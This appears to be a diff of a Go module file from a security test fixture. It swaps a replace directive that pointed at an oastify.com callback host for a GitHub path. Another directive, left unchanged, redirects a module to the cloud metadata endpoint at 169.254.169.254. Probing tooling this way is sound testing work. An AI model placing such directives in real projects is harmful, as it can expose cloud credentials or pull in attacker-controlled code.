@@ -14,7 +14,7 @@ require (
 	snykinternal.example/m v1.0.0
 )
 
-replace ctrl.example/m => suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com/ctrl v1.0.0
+replace ctrl.example/m => github.com/Life-y/ctrlmod v1.0.0
 
 replace metadata.aws.example/m => http://169.254.169.254/latest/meta-data/ v1.0.0
 
